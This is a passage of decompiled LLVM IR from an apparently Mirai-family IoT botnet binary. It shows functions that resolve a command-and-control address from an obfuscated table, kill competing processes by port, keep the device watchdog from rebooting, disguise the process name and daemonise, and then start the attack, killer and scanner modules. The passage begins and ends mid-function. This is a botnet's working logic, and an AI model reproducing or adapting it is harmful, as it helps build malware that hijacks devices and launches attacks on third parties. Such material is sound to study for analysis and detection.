  uselistorder i32 %v2_100060dc, { 1, 0 }
  uselistorder i32 %v1_10006254, { 1, 2, 0 }
  uselistorder i32 %v1_10006234, { 1, 0 }
  uselistorder i32 %v0_10006254, { 1, 0 }
  uselistorder i32 %v0_1000621c, { 0, 2, 1, 3 }
  uselistorder i32 %v2_10006138, { 1, 0 }
  uselistorder i32 %v1_100060e8, { 2, 1, 0, 3 }
  uselistorder i32 %v2_100060a8, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v0_10005ff4, { 1, 0, 3, 2 }
  uselistorder i32* %stack_var_-632, { 1, 0 }
  uselistorder i32* %r29.global-to-local, { 3, 4, 5, 0, 1, 2 }
  uselistorder i32* %r28.global-to-local, { 0, 5, 3, 4, 1, 2 }
  uselistorder i32* %r10.global-to-local, { 2, 3, 4, 0, 1 }
  uselistorder i32 (i32, i32)* @util_atoi, { 5, 4, 3, 2, 0, 1 }
  uselistorder i32 (i32*)* @__GI_readdir, { 3, 2, 0, 4, 5, 6, 7, 1 }
  uselistorder i32 268460256, { 1, 0 }
  uselistorder i32 (i32)* @__GI_opendir, { 2, 1, 0 }
  uselistorder label %dec_label_pc_100060d8.backedge, { 2, 4, 3, 1, 0 }
  uselistorder label %dec_label_pc_1000627c, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10006238, { 1, 0 }
  uselistorder label %dec_label_pc_100061fc, { 1, 0 }
  uselistorder label %dec_label_pc_100060e8, { 1, 0 }
  uselistorder label %dec_label_pc_100060e8.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_10006068, { 2, 1, 0 }
}

define i32 @anti_gdb_entry() local_unnamed_addr {
entry:
  store i32 268460844, i32* @global_var_10021198.113, align 4
  %v0_10006328 = load i32, i32* @r3, align 4
  ret i32 %v0_10006328
}

define i32 @resolve_cnc_addr() local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_10006348.114 to i32), i32* @lr, align 4
  %v1_10006344 = call i32 @table_unlock_val(i32 2)
  store i32 -1182179548, i32* @global_var_10023828.116, align 4
  %v3_10006360 = call i32 @table_retrieve_val(i32 2, i32* null)
  %v4_10006360 = inttoptr i32 %v3_10006360 to i16*
  %v3_10006364 = load i16, i16* %v4_10006360, align 2
  store i16 %v3_10006364, i16* bitcast (i32* @global_var_10023826.117 to i16*), align 4
  store i32 268460916, i32* @lr, align 4
  %v1_10006370 = call i32 @table_lock_val(i32 2)
  ret i32 %v1_10006370
}

define i32 @ensure_single_instance(i32 %arg1) local_unnamed_addr {
entry:
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  store i32 1, i32* %stack_var_-56, align 4
  store i32 268460996, i32* @lr, align 4
  %v3_100063c0 = call i32 @socket(i32 2, i32 1, i32 0)
  %v3_100063c4 = icmp eq i32 %v3_100063c0, -1
  store i32 %v3_100063c0, i32* @global_var_1002119c.118, align 4
  br i1 %v3_100063c4, label %dec_label_pc_10006478, label %dec_label_pc_100063d0

dec_label_pc_100063d0:                            ; preds = %entry
  %v2_100063d0 = ptrtoint i32* %stack_var_-56 to i32
  store i32 268461028, i32* @lr, align 4
  %v5_100063e0 = call i32 @__GI_setsockopt(i32 %v3_100063c0, i32 1, i32 2, i32 %v2_100063d0, i32 4)
  %v3_100063e4 = load i32, i32* @global_var_1002119c.118, align 4
  store i32 %v3_100063e4, i32* %r29.global-to-local, align 4
  store i32 3, i32* @r4, align 4
  store i32 0, i32* @r5, align 4
  store i32 268566528, i32* @r27, align 4
  store i32 268461056, i32* @lr, align 4
  %v2_100063fc = call i32 @__libc_fcntl(i32 %v3_100063e4)
  store i32 4, i32* @r4, align 4
  %v1_10006404 = or i32 %v2_100063fc, 2048
  store i32 %v1_10006404, i32* @r5, align 4
  %v0_10006408 = load i32, i32* @r29, align 4
  store i32 268461076, i32* @lr, align 4
  %v2_10006410 = call i32 @__libc_fcntl(i32 %v0_10006408)
  %v3_10006414 = load i8, i8* @global_var_10021070.119, align 1
  %v3_1000641c = icmp eq i8 %v3_10006414, 0
  br i1 %v3_1000641c, label %dec_label_pc_1000649c, label %dec_label_pc_10006428

dec_label_pc_10006428:                            ; preds = %dec_label_pc_100063d0
  store i32 0, i32* %r28.global-to-local, align 4
  %v0_10006438 = call i32 @__GI___errno_location()
  %v2_1000643c = ptrtoint i32* %stack_var_-52 to i32
  %v2_10006440 = inttoptr i32 %v0_10006438 to i32*
  store i32 0, i32* %v2_10006440, align 4
  store i32 %v0_10006438, i32* %r29.global-to-local, align 4
  %v3_10006450 = load i32, i32* @global_var_1002119c.118, align 4
  store i32 2, i32* %stack_var_-52, align 4
  store i32 268461152, i32* @lr, align 4
  %v3_1000645c = call i32 @bind(i32 %v3_10006450, i32 %v2_1000643c, i32 16)
  %v3_10006460 = icmp eq i32 %v3_1000645c, -1
  br i1 %v3_10006460, label %dec_label_pc_100064e4, label %dec_label_pc_10006468

dec_label_pc_10006468:                            ; preds = %dec_label_pc_1000649c, %dec_label_pc_10006428
  %v3_10006470 = load i32, i32* @global_var_1002119c.118, align 4
  store i32 268461176, i32* @lr, align 4
  %v2_10006474 = call i32 @listen(i32 %v3_10006470, i32 1)
  br label %dec_label_pc_10006478

dec_label_pc_10006478:                            ; preds = %entry, %dec_label_pc_10006468
  %v0_10006498 = phi i32 [ -1, %entry ], [ %v2_10006474, %dec_label_pc_10006468 ]
  ret i32 %v0_10006498

dec_label_pc_1000649c:                            ; preds = %dec_label_pc_100063d0
  store i32 0, i32* %r28.global-to-local, align 4
  %v2_100064b0 = ptrtoint i32* %stack_var_-52 to i32
  %v0_100064b8 = call i32 @__GI___errno_location()
  %v2_100064bc = inttoptr i32 %v0_100064b8 to i32*
  store i32 0, i32* %v2_100064bc, align 4
  store i32 %v0_100064b8, i32* %r29.global-to-local, align 4
  %v3_100064cc = load i32, i32* @global_var_1002119c.118, align 4
  store i32 2, i32* %stack_var_-52, align 4
  store i32 268461276, i32* @lr, align 4
  %v3_100064d8 = call i32 @bind(i32 %v3_100064cc, i32 %v2_100064b0, i32 16)
  %v3_100064dc = icmp eq i32 %v3_100064d8, -1
  br i1 %v3_100064dc, label %dec_label_pc_100064e4, label %dec_label_pc_10006468

dec_label_pc_100064e4:                            ; preds = %dec_label_pc_1000649c, %dec_label_pc_10006428
  %v0_100064e4 = load i32, i32* %r29.global-to-local, align 4
  %v1_100064e4 = inttoptr i32 %v0_100064e4 to i32*
  %v2_100064e4 = load i32, i32* %v1_100064e4, align 4
  %v3_100064e8 = icmp eq i32 %v2_100064e4, 99
  br i1 %v3_100064e8, label %dec_label_pc_10006558, label %dec_label_pc_100064f0

dec_label_pc_100064f0:                            ; preds = %dec_label_pc_10006558, %dec_label_pc_100064e4, %dec_label_pc_10006564
  %v3_100064f0 = load i32, i32* @global_var_1002119c.118, align 4
  %v1_100064f8 = ptrtoint i32* %stack_var_-52 to i32
  store i32 2, i32* %stack_var_-52, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10006518.120 to i32), i32* @lr, align 4
  %v3_10006514 = call i32 @__libc_connect(i32 %v3_100064f0, i32 %v1_100064f8, i32 16)
  store i32 268461344, i32* @lr, align 4
  %v1_1000651c = call i32 @sleep(i32 5)
  %v3_10006520 = load i32, i32* @global_var_1002119c.118, align 4
  store i32 %v3_10006520, i32* @r3, align 4
  %v0_10006524 = call i32 @__GI___libc_close()
  store i32 268461360, i32* @lr, align 4
  %v1_1000652c = call i32 @killer_kill_by_port(i32 1991)
  store i32 268461364, i32* @lr, align 4
  %v1_10006530 = call i32 @ensure_single_instance(i32 %v1_1000652c)
  ret i32 %v1_10006530

dec_label_pc_10006558:                            ; preds = %dec_label_pc_100064e4
  %v3_10006558 = load i8, i8* @global_var_10021070.119, align 1
  %v3_1000655c = icmp eq i8 %v3_10006558, 0
  br i1 %v3_1000655c, label %dec_label_pc_100064f0, label %dec_label_pc_10006564

dec_label_pc_10006564:                            ; preds = %dec_label_pc_10006558
  %v0_10006568 = load i32, i32* %r28.global-to-local, align 4
  %v1_10006568 = trunc i32 %v0_10006568 to i8
  store i8 %v1_10006568, i8* @global_var_10021070.119, align 1
  br label %dec_label_pc_100064f0

; uselistorder directives
  uselistorder i32* %stack_var_-56, { 1, 0 }
  uselistorder i32* %stack_var_-52, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32* %r29.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r28.global-to-local, { 1, 0, 2 }
  uselistorder i32 (i32, i32)* @listen, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @bind, { 2, 1, 0, 3 }
  uselistorder i8* @global_var_10021070.119, { 2, 1, 0 }
  uselistorder label %dec_label_pc_100064f0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10006478, { 1, 0 }
}

define i32 @watchdog_maintain(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  %v0_10006578 = load i32, i32* @r30, align 4
  %v0_1000657c = load i32, i32* @r31, align 4
  store i32 268461448, i32* @lr, align 4
  %v0_10006584 = call i32 @__libc_fork()
  store i32 %v0_10006584, i32* @global_var_100211f4.121, align 4
  %tmp8 = icmp slt i32 %v0_10006584, 1
  br i1 %tmp8, label %dec_label_pc_100065b0, label %dec_label_pc_10006598

dec_label_pc_10006598:                            ; preds = %dec_label_pc_100065b0, %entry
  store i32 %v0_10006578, i32* @r30, align 4
  store i32 %v0_1000657c, i32* @r31, align 4
  ret i32 %v0_10006584

dec_label_pc_100065b0:                            ; preds = %entry
  %v3_100065b0 = icmp eq i32 %v0_10006584, -1
  br i1 %v3_100065b0, label %dec_label_pc_10006598, label %dec_label_pc_100065b8

dec_label_pc_100065b8:                            ; preds = %dec_label_pc_100065b0
  store i32 1, i32* %stack_var_-24, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_100065c8.122 to i32), i32* @lr, align 4
  %v1_100065c4 = call i32 @table_unlock_val(i32 59)
  store i32 268461520, i32* @lr, align 4
  %v1_100065cc = call i32 @table_unlock_val(i32 60)
  %v3_100065d8 = call i32 @table_retrieve_val(i32 59, i32* null)
  store i32 %v3_100065d8, i32* @r3, align 4
  %v2_100065e4 = call i32 @__libc_open(i32 %v3_100065d8, i32 2)
  %v3_100065e8 = icmp eq i32 %v2_100065e4, -1
  store i32 %v2_100065e4, i32* @r31, align 4
  br i1 %v3_100065e8, label %dec_label_pc_10006634, label %dec_label_pc_100065f4

dec_label_pc_100065f4:                            ; preds = %dec_label_pc_10006634, %dec_label_pc_100065b8
  %v0_100065f8 = phi i32 [ %v2_10006648, %dec_label_pc_10006634 ], [ %v2_100065e4, %dec_label_pc_100065b8 ]
  %v2_10006600 = ptrtoint i32* %stack_var_-24 to i32
  store i32 -2147221504, i32* @r30, align 4
  store i32 268461584, i32* @lr, align 4
  %v3_1000660c = call i32 @ioctl(i32 %v0_100065f8, i32 -2147199228, i32 %v2_10006600)
  %v0_10006610 = load i32, i32* @r30, align 4
  %v1_10006610 = or i32 %v0_10006610, 22277
  store i32 %v1_10006610, i32* @r30, align 4
  br label %dec_label_pc_10006614

dec_label_pc_10006614:                            ; preds = %dec_label_pc_10006614, %dec_label_pc_100065f4
  %v0_10006618 = phi i32 [ %v0_10006618.pre, %dec_label_pc_10006614 ], [ %v1_10006610, %dec_label_pc_100065f4 ]
  %v0_10006614 = load i32, i32* @r31, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10006628.123 to i32), i32* @lr, align 4
  %v3_10006624 = call i32 @ioctl(i32 %v0_10006614, i32 %v0_10006618, i32 0)
  store i32 268461616, i32* @lr, align 4
  %v1_1000662c = call i32 @sleep(i32 10)
  %v0_10006618.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_10006614

dec_label_pc_10006634:                            ; preds = %dec_label_pc_100065b8
  %v3_1000663c = call i32 @table_retrieve_val(i32 60, i32* null)
  store i32 %v3_1000663c, i32* @r3, align 4
  %v2_10006648 = call i32 @__libc_open(i32 %v3_1000663c, i32 2)
  %v3_1000664c = icmp eq i32 %v2_10006648, -1
  store i32 %v2_10006648, i32* @r31, align 4
  br i1 %v3_1000664c, label %dec_label_pc_10006658, label %dec_label_pc_100065f4

dec_label_pc_10006658:                            ; preds = %dec_label_pc_10006634
  store i32 ptrtoint ([3 x i8]* @global_var_10006660.124 to i32), i32* @lr, align 4
  %v1_1000665c = call i32 @table_lock_val(i32 59)
  store i32 ptrtoint ([3 x i8]* @global_var_10006668.125 to i32), i32* @lr, align 4
  %v1_10006664 = call i32 @table_lock_val(i32 60)
  %v0_1000666c = call i32 @__GI_exit()
  ret i32 %v0_1000666c

; uselistorder directives
  uselistorder i32 %v2_10006648, { 1, 2, 0 }
  uselistorder i32 %v0_10006584, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @main(i32 %argc, i8** %argv) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8** %argv to i32
  store i32 %argc, i32* %r3.global-to-local, align 4
  %stack_var_-1112 = alloca i32, align 4
  %stack_var_-1448 = alloca i32, align 4
  %stack_var_-1468 = alloca i32, align 4
  %stack_var_-1472 = alloca i32, align 4
  %stack_var_-1456 = alloca i32, align 4
  %stack_var_-1240 = alloca i32, align 4
  %stack_var_-1368 = alloca i32, align 4
  %stack_var_-1476 = alloca i32, align 4
  %stack_var_-1480 = alloca i16, align 2
  %stack_var_-1432 = alloca i32, align 4
  %stack_var_-1400 = alloca i32, align 4
  %stack_var_-1464 = alloca i32, align 4
  %v0_10006674 = load i32, i32* @lr, align 4
  %v2_1000667c = ptrtoint i32* %stack_var_-1464 to i32
  %v0_10006680 = load i32, i32* @r28, align 4
  store i32 %argc, i32* @r28, align 4
  store i32 %v2_1000667c, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %stack_var_-1476, align 4
  store i32 268566528, i32* @r22, align 4
  store i32 268566528, i32* @r23, align 4
  %v2_100066ac = ptrtoint i32* %stack_var_-1400 to i32
  store i32 %v2_100066ac, i32* @r24, align 4
  store i32 %tmp, i32* @r31, align 4
  %v2_100066e8 = call i32 @sigemptyset(i32* nonnull %stack_var_-1464)
  store i32 %v2_1000667c, i32* @r3, align 4
  %v2_100066f4 = call i32 @__GI_sigaddset(i32 %v2_1000667c, i32 2)
  store i32 0, i32* %r3.global-to-local, align 4
  %v4_10006704 = call i32 @__GI_sigprocmask(i32 0, i32* nonnull %stack_var_-1464, i32 0)
  store i32 17, i32* %r3.global-to-local, align 4
  store i32 268461844, i32* @lr, align 4
  %v2_10006710 = call i32 @bsd_signal(i32 17, i32 1)
  store i32 5, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10006724.126 to i32), i32* @lr, align 4
  %v2_10006720 = call i32 @bsd_signal(i32 5, i32 268460824)
  store i32 %v2_10006720, i32* %r3.global-to-local, align 4
  store i32 268461864, i32* @lr, align 4
  %v1_10006724 = call i32 @util_local_addr(i32 %v2_10006720)
  store i32 %v1_10006724, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10023824.115 to i32), i32* @r25, align 4
  store i16 2, i16* bitcast (i32* @global_var_10023824.115 to i16*), align 4
  store i32 -1334109607, i32* %r9.global-to-local, align 4
  store i32 23, i32* %r0.global-to-local, align 4
  store i32 %v1_10006724, i32* @global_var_100211e0.76, align 4
  store i16 23, i16* bitcast (i32* @global_var_10023826.117 to i16*), align 4
  store i32 -1334109607, i32* @global_var_10023828.116, align 4
  store i32 268461908, i32* @lr, align 4
  %v2_10006750 = call i32 @table_init(i32 %v1_10006724, i32 -1334109607)
  store i32 %v2_10006750, i32* %r3.global-to-local, align 4
  store i32 268460844, i32* %r9.global-to-local, align 4
  store i32 268460844, i32* @global_var_10021198.113, align 4
  store i32 ptrtoint (i32* @global_var_10006764.127 to i32), i32* @lr, align 4
  %v1_10006760 = call i32 @ensure_single_instance(i32 %v2_10006750)
  store i32 %v1_10006760, i32* %r3.global-to-local, align 4
  store i32 268461928, i32* @lr, align 4
  %v1_10006764 = call i32 @rand_init(i32 %v1_10006760)
  store i32 %v2_100066ac, i32* @r3, align 4
  store i32 32, i32* @r4, align 4
  store i32 268461940, i32* @lr, align 4
  %v0_10006770 = call i32 @util_zero()
  store i32 %v0_10006770, i32* %r3.global-to-local, align 4
  %v0_10006774 = load i32, i32* @r28, align 4
  %v3_10006774 = icmp eq i32 %v0_10006774, 2
  br i1 %v3_10006774, label %dec_label_pc_100068ec, label %dec_label_pc_1000677c

dec_label_pc_1000677c:                            ; preds = %dec_label_pc_100068ec, %entry, %dec_label_pc_100068fc
  %v0_1000677c = call i32 @rand_next()
  store i32 %v0_1000677c, i32* %r3.global-to-local, align 4
  %v2_10006780 = ptrtoint i32* %stack_var_-1432 to i32
  store i32 %v2_10006780, i32* @r27, align 4
  store i32 %v0_1000677c, i32* %r28.global-to-local, align 4
  %v0_10006788 = load i32, i32* @r31, align 4
  %v1_10006788 = inttoptr i32 %v0_10006788 to i32*
  %v2_10006788 = load i32, i32* %v1_10006788, align 4
  store i32 %v2_10006788, i32* %r3.global-to-local, align 4
  %v2_1000678c = ptrtoint i16* %stack_var_-1480 to i32
  store i32 %v2_1000678c, i32* @r30, align 4
  store i32 0, i32* @r26, align 4
  store i32 268461976, i32* @lr, align 4
  %v1_10006794 = inttoptr i32 %v2_10006788 to i8*
  %v2_10006794 = call i32 @util_strlen(i8* %v1_10006794)
  store i32 %v2_10006794, i32* %r3.global-to-local, align 4
  %v0_1000679c = load i32, i32* @r31, align 4
  %v1_1000679c = inttoptr i32 %v0_1000679c to i32*
  %v2_1000679c = load i32, i32* %v1_1000679c, align 4
  store i32 %v2_1000679c, i32* %r3.global-to-local, align 4
  %v1_100067a0 = sub i32 20, %v2_10006794
  store i32 268461992, i32* @lr, align 4
  %v1_100067a4 = inttoptr i32 %v2_1000679c to i8*
  %v2_100067a4 = call i32 @util_strlen(i8* %v1_100067a4)
  %v0_100067a8 = load i32, i32* %r28.global-to-local, align 4
  %v2_100067a8 = urem i32 %v0_100067a8, %v1_100067a0
  %v2_100067ac = sub i32 %v0_100067a8, %v2_100067a8
  store i32 %v2_100067ac, i32* %r0.global-to-local, align 4
  %v2_100067b4 = add i32 %v2_100067a8, %v2_100067a4
  store i32 %v2_10006780, i32* @r3, align 4
  store i32 %v2_100067b4, i32* @r4, align 4
  %v0_100067c0 = load i32, i32* @r30, align 4
  %v2_100067c0 = add i32 %v0_100067c0, %v2_100067b4
  store i32 %v2_100067c0, i32* @r29, align 4
  store i32 268462024, i32* @lr, align 4
  %v0_100067c4 = call i32 @rand_alphastr()
  store i32 %v0_100067c4, i32* %r3.global-to-local, align 4
  %v0_100067c8 = load i32, i32* @r31, align 4
  %v1_100067c8 = inttoptr i32 %v0_100067c8 to i32*
  %v2_100067c8 = load i32, i32* %v1_100067c8, align 4
  store i32 %v2_100067c8, i32* @r3, align 4
  %v0_100067cc = load i32, i32* @r26, align 4
  %v1_100067cc = trunc i32 %v0_100067cc to i8
  %v2_100067cc = load i32, i32* @r29, align 4
  %v3_100067cc = add i32 %v2_100067cc, 48
  %v4_100067cc = inttoptr i32 %v3_100067cc to i8*
  store i8 %v1_100067cc, i8* %v4_100067cc, align 1
  %v2_100067d4 = inttoptr i32 %v2_100067c8 to i8*
  %v3_100067d4 = call i32 @util_strcpy(i8* %v2_100067d4, i32 %v2_10006780)
  store i32 32, i32* @r4, align 4
  store i32 %v2_10006780, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_100067e4.129 to i32), i32* @lr, align 4
  %v0_100067e0 = call i32 @util_zero()
  store i32 %v0_100067e0, i32* %r3.global-to-local, align 4
  %v0_100067e4 = call i32 @rand_next()
  store i32 %v0_100067e4, i32* %r3.global-to-local, align 4
  store i32 %v0_100067e4, i32* %r28.global-to-local, align 4
  %v0_100067ec = load i32, i32* @r31, align 4
  %v1_100067ec = inttoptr i32 %v0_100067ec to i32*
  %v2_100067ec = load i32, i32* %v1_100067ec, align 4
  store i32 %v2_100067ec, i32* %r3.global-to-local, align 4
  store i32 268462068, i32* @lr, align 4
  %v1_100067f0 = inttoptr i32 %v2_100067ec to i8*
  %v2_100067f0 = call i32 @util_strlen(i8* %v1_100067f0)
  store i32 %v2_100067f0, i32* %r3.global-to-local, align 4
  %v0_100067f8 = load i32, i32* @r31, align 4
  %v1_100067f8 = inttoptr i32 %v0_100067f8 to i32*
  %v2_100067f8 = load i32, i32* %v1_100067f8, align 4
  store i32 %v2_100067f8, i32* %r3.global-to-local, align 4
  %v1_100067fc = sub i32 20, %v2_100067f0
  store i32 268462084, i32* @lr, align 4
  %v1_10006800 = inttoptr i32 %v2_100067f8 to i8*
  %v2_10006800 = call i32 @util_strlen(i8* %v1_10006800)
  %v0_10006804 = load i32, i32* %r28.global-to-local, align 4
  %v2_10006804 = urem i32 %v0_10006804, %v1_100067fc
  %v2_10006808 = sub i32 %v0_10006804, %v2_10006804
  store i32 %v2_10006808, i32* %r0.global-to-local, align 4
  store i32 %v2_10006804, i32* @r28, align 4
  %v2_10006810 = add i32 %v2_10006804, %v2_10006800
  store i32 %v2_10006780, i32* @r3, align 4
  store i32 %v2_10006810, i32* @r4, align 4
  %v0_1000681c = load i32, i32* @r30, align 4
  %v2_1000681c = add i32 %v0_1000681c, %v2_10006810
  store i32 %v2_1000681c, i32* @r29, align 4
  store i32 268462116, i32* @lr, align 4
  %v0_10006820 = call i32 @rand_alphastr()
  %v0_10006824 = load i32, i32* @r26, align 4
  %v1_10006824 = trunc i32 %v0_10006824 to i8
  %v2_10006824 = load i32, i32* @r29, align 4
  %v3_10006824 = add i32 %v2_10006824, 48
  %v4_10006824 = inttoptr i32 %v3_10006824 to i8*
  store i8 %v1_10006824, i8* %v4_10006824, align 1
  store i32 15, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10006838.130 to i32), i32* @lr, align 4
  %v2_10006834 = call i32 @prctl(i32 15, i32 %v2_10006780)
  store i32 5, i32* %r3.global-to-local, align 4
  store i32 268462144, i32* @lr, align 4
  %v1_1000683c = call i32 @table_unlock_val(i32 5)
  store i32 5, i32* %r3.global-to-local, align 4
  %v3_10006848 = call i32 @table_retrieve_val(i32 5, i32* nonnull %stack_var_-1476)
  store i32 1, i32* @r3, align 4
  %v2_10006858 = call i32 @__GI___libc_write(i32 1, i32 %v3_10006848)
  store i32 1, i32* @r3, align 4
  %v2_1000686c = call i32 @__GI___libc_write(i32 1, i32 ptrtoint (i32* @global_var_10010118.131 to i32))
  store i32 5, i32* %r3.global-to-local, align 4
  store i32 268462200, i32* @lr, align 4
  %v1_10006874 = call i32 @table_lock_val(i32 5)
  store i32 %v1_10006874, i32* %r3.global-to-local, align 4
  store i32 268462204, i32* @lr, align 4
  %v1_10006878 = call i32 @attack_init(i32 %v1_10006874)
  store i32 %v1_10006878, i32* %r3.global-to-local, align 4
  store i32 268462208, i32* @lr, align 4
  %v1_1000687c = call i32 @killer_init(i32 %v1_10006878)
  store i32 %v1_1000687c, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10006884.133 to i32), i32* @lr, align 4
  %v1_10006880 = call i32 @watchdog_maintain(i32 %v1_1000687c)
  store i32 %v1_10006880, i32* %r3.global-to-local, align 4
  store i32 268462216, i32* @lr, align 4
  %v0_10006884 = call i32 @__libc_fork()
  store i32 %v0_10006884, i32* %r3.global-to-local, align 4
  %tmp45 = icmp slt i32 %v0_10006884, 1
  br i1 %tmp45, label %dec_label_pc_10006924, label %dec_label_pc_10006890

dec_label_pc_10006890:                            ; preds = %dec_label_pc_1000677c
  store i32 %v0_10006674, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v0_10006680, i32* %r28.global-to-local, align 4
  ret i32 0

dec_label_pc_100068ec:                            ; preds = %entry
  %v0_100068ec = load i32, i32* @r31, align 4
  %v1_100068ec = add i32 %v0_100068ec, 4
  %v2_100068ec = inttoptr i32 %v1_100068ec to i32*
  %v3_100068ec = load i32, i32* %v2_100068ec, align 4
  store i32 %v3_100068ec, i32* %r3.global-to-local, align 4
  store i32 268462324, i32* @lr, align 4
  %v1_100068f0 = inttoptr i32 %v3_100068ec to i8*
  %v2_100068f0 = call i32 @util_strlen(i8* %v1_100068f0)
  store i32 %v2_100068f0, i32* %r3.global-to-local, align 4
  %v2_100068f4 = icmp sgt i32 %v2_100068f0, 31
  br i1 %v2_100068f4, label %dec_label_pc_1000677c, label %dec_label_pc_100068fc

dec_label_pc_100068fc:                            ; preds = %dec_label_pc_100068ec
  %v0_100068fc = load i32, i32* @r31, align 4
  %v1_100068fc = add i32 %v0_100068fc, 4
  %v2_100068fc = inttoptr i32 %v1_100068fc to i32*
  %v3_100068fc = load i32, i32* %v2_100068fc, align 4
  store i32 %v2_100066ac, i32* @r3, align 4
  %v2_10006904 = bitcast i32* %stack_var_-1400 to i8*
  %v3_10006904 = call i32 @util_strcpy(i8* %v2_10006904, i32 %v3_100068fc)
  store i32 %v3_10006904, i32* %r3.global-to-local, align 4
  %v0_10006908 = load i32, i32* @r31, align 4
  %v1_10006908 = add i32 %v0_10006908, 4
  %v2_10006908 = inttoptr i32 %v1_10006908 to i32*
  %v3_10006908 = load i32, i32* %v2_10006908, align 4
  store i32 %v3_10006908, i32* %r3.global-to-local, align 4
  store i32 268462356, i32* @lr, align 4
  %v1_10006910 = inttoptr i32 %v3_10006908 to i8*
  %v2_10006910 = call i32 @util_strlen(i8* %v1_10006910)
  store i32 %v2_10006910, i32* @r4, align 4
  store i32 %v3_10006908, i32* @r3, align 4
  store i32 268462368, i32* @lr, align 4
  %v0_1000691c = call i32 @util_zero()
  store i32 %v0_1000691c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000677c

dec_label_pc_10006924:                            ; preds = %dec_label_pc_1000677c
  store i32 268462376, i32* @lr, align 4
  %v1_10006924 = call i32 @__GI_setsid(i32 %v0_10006884)
  store i32 268566528, i32* @r26, align 4
  store i32 %v1_10006924, i32* @r17, align 4
  store i32 0, i32* @r3, align 4
  %v0_10006934 = call i32 @__GI___libc_close()
  store i32 1, i32* @r3, align 4
  %v0_1000693c = call i32 @__GI___libc_close()
  store i32 2, i32* @r3, align 4
  %v0_10006944 = call i32 @__GI___libc_close()
  store i32 %v0_10006944, i32* %r3.global-to-local, align 4
  store i32 268566528, i32* @r19, align 4
  store i32 268462416, i32* @lr, align 4
  %v1_1000694c = call i32 @attack_init(i32 %v0_10006944)
  store i32 %v1_1000694c, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r20, align 4
  store i32 268462424, i32* @lr, align 4
  %v1_10006954 = call i32 @killer_init(i32 %v1_1000694c)
  store i32 %v1_10006954, i32* %r3.global-to-local, align 4
  %v2_10006958 = ptrtoint i32* %stack_var_-1368 to i32
  store i32 %v2_10006958, i32* %r28.global-to-local, align 4
  store i32 268462432, i32* @lr, align 4
  %v1_1000695c = call i32 @watchdog_maintain(i32 %v1_10006954)
  store i32 %v1_1000695c, i32* %r3.global-to-local, align 4
  %v2_10006960 = ptrtoint i32* %stack_var_-1240 to i32
  store i32 %v2_10006960, i32* @r29, align 4
  store i32 ptrtoint (i32* @global_var_10006968.136 to i32), i32* @lr, align 4
  %v1_10006964 = call i32 @scanner_init(i32 %v1_1000695c)
  store i32 %v1_10006964, i32* %r3.global-to-local, align 4
  store i32 -858993459, i32* %r0.global-to-local, align 4
  store i32 715827883, i32* %r9.global-to-local, align 4
  store i32 268566528, i32* @r21, align 4
  %v2_10006984 = ptrtoint i32* %stack_var_-1456 to i32
  %v2_10006988 = ptrtoint i32* %stack_var_-1472 to i32
  %v2_10006d98 = ptrtoint i32* %stack_var_-1112 to i32
  %v2_10006c7c = ptrtoint i32* %stack_var_-1468 to i32
  %v1_10006d10 = bitcast i32* %stack_var_-1400 to i8*
  %v2_10006cd4 = ptrtoint i32* %stack_var_-1448 to i32
  br label %dec_label_pc_10006994

dec_label_pc_10006994:                            ; preds = %dec_label_pc_10006db8, %dec_label_pc_10006d78, %dec_label_pc_10006d6c, %dec_label_pc_10006d0c, %dec_label_pc_10006b60, %dec_label_pc_10006b54, %dec_label_pc_10006a50, %dec_label_pc_10006e00, %dec_label_pc_10006df4, %dec_label_pc_10006d58, %dec_label_pc_10006c98, %dec_label_pc_10006bc8, %dec_label_pc_10006b18, %dec_label_pc_10006924
  store i32 4, i32* %r9.global-to-local, align 4
  store i32 0, i32* %stack_var_-1368, align 4
  store i32 31, i32* %r0.global-to-local, align 4
  store i32 31, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_100069a8

dec_label_pc_100069a8:                            ; preds = %dec_label_pc_100069a8, %dec_label_pc_10006994
  %v1_100069ac = phi i32 [ %v1_100069b0, %dec_label_pc_100069a8 ], [ 4, %dec_label_pc_10006994 ]
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_100069ac = load i32, i32* @r28, align 4
  %v3_100069ac = add i32 %v2_100069ac, %v1_100069ac
  %v4_100069ac = inttoptr i32 %v3_100069ac to i32*
  store i32 0, i32* %v4_100069ac, align 4
  %v0_100069b0 = load i32, i32* %r9.global-to-local, align 4
  %v1_100069b0 = add i32 %v0_100069b0, 4
  store i32 %v1_100069b0, i32* %r9.global-to-local, align 4
  %v0_100069b4 = load i32, i32* %ctr.global-to-local, align 4
  %v1_100069b4 = add i32 %v0_100069b4, -1
